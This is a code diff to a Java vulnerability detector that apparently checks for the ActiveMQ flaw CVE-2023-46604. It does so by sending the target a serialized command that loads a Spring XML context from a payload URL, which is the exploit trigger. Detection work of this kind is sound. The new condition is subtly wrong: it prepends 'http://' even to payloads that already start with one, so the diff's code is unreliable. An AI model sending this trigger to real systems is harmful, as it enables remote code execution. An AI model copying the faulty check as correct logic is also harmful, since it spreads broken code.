@@ -165,17 +165,8 @@ public final class Cve202346604Detector implements VulnDetector {
   private boolean sendPayloadToTarget(String host, int port, Payload payload) {
     try {
       String payloadString = payload.getPayload();
-      String payloadWithoutProtocol;
-      // I noticed that there are two types of SSRF payload, one the payload exists as a
-      // subdomain and other exists as an http path
-      if (payloadString.contains("http://") || payloadString.contains("https://")) {
-        Matcher m = Pattern.compile("https?://(.*)").matcher(payloadString);
-        if (!m.find()) {
-          return false;
-        }
-        payloadWithoutProtocol = m.group(1);
-      } else {
-        payloadWithoutProtocol = payloadString;
+      if (!payloadString.contains("http://") || !payloadString.contains("https://")) {
+        payloadString = "http://" + payloadString;
       }
       Socket socket = socketFactory.createSocket(host, port);
       OutputStream os = socket.getOutputStream();
@@ -196,7 +187,7 @@ public final class Cve202346604Detector implements VulnDetector {
       dos.writeBoolean(true);
       dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
       dos.writeBoolean(true);
-      dos.writeUTF(payloadWithoutProtocol);
+      dos.writeUTF(payloadString);
 
       dos.close();
       os.close();
